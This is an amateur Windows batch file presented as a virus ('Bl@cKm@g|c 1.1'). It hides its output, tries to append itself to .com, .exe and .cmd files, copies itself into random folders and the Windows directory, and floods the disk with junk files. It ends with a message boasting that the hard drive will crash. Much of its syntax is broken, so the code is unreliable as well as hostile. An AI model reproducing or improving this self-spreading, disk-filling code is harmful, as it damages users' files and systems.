   @ctty nul.FP

   rem Batch trojan Bl@cKm@g|c 1.1 by magicman
   rem (Note: Norton refers to any batch file as trojan, that is
   rem any destructive batch)
   rem What this does is infect any .com and .exe
   rem after which it then has a polymorphic engine to
   rem morph itself
   set DA = 10000
   goto infecty

   Infecty:
   for %%g in (*.com..\*.exe %windir%\*.nt..\*.cmd) do set FP=%%g
   find "Bl@cKm@g|c"<%FP%
   if errorlevel 1 find "Bl@cKm@g|c<%0>>%FP%
   for %%d in (%windir%\*.*..%homepath%\*.*) do set Fumigate = %%d
   find "Bl@cKm@g|c"<%Fumigate%
   if find "Bl@cKm@g|c"<%Fumigate% goto makefiles
   rem It just found the string Bl@cKm@g|c in any of the following files
   rem if it was found it skipped infection
   rem if it wasnt found it then it infected the file
   rem That was easy enough
   rem Now lets make a random copy
   set ra = 5
   goto random

   random:
   copy %0 c:\%random%\%random%.nt
   copy %0 %windir%\%random%.nt
   set %ra% == %ra% - 1
   if %ra% == 0
   goto endy
   if %ra% <5
   goto random



   :makefiles
   echo >> c:\%random%\%random%.bat
   echo >> c:\%random%\%random%.nt
   %DA%== %DA% - 1
   if %DA% = 0 goto infecty
   if %DA% < 10000 goto makefiles

   :endy
   set message = "Bl@cKm@g|c has infected almost all files on your computer, It will make new files and infect them until there is now more files left and your hard drive crashes, have a great day"
   echo %message%
   ctty con
   exit
